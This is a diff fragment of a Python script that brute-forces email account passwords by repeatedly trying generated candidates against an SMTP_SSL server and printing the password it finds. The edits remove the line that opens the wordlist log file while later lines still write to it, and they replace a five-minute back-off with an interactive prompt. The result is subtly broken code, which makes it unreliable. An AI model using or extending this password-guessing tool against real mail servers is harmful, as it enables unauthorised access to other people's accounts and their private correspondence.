@@ -15,7 +15,6 @@ serv = serv.split(":")
 print("Connecting to ", serv[0]," using port ", serv[1],"...\n \n")
 s = smtplib.SMTP_SSL(serv[0], serv[1])
 print("Connected !\n \n")
-save = open("Use_this_wordlist.txt", "a")
 
 
 def generateAndBruteForce(cible, minn, maxx, charset, choix) :
@@ -33,7 +32,7 @@ def generateAndBruteForce(cible, minn, maxx, charset, choix) :
 				except smtplib.SMTPServerDisconnected or ConnectionAbortedError:
 					print("Connection to", serv[0], " failed :/, you should may be check your connection to Internet.\nWaiting a minute before restarting. . .\n")
 					save.write(charset+"\n")
-					time.sleep(60*5)
+					input("Continue ?")
 					pass
 				else :
 					print("The password found is ", charset)
@@ -56,7 +55,7 @@ def generateAndBruteForce(cible, minn, maxx, charset, choix) :
 					except smtplib.SMTPServerDisconnected or ConnectionAbortedError:
 						print("Connection to", serv[0], " failed :/, you should may be check your connection to Internet.\nWaiting a minute before restarting. . .\n")
 						save.write(charset+"\n")
-						time.sleep(60*5)
+						input("Continue ?")
 						pass
 					else :
 						print("The password found is ", charset)
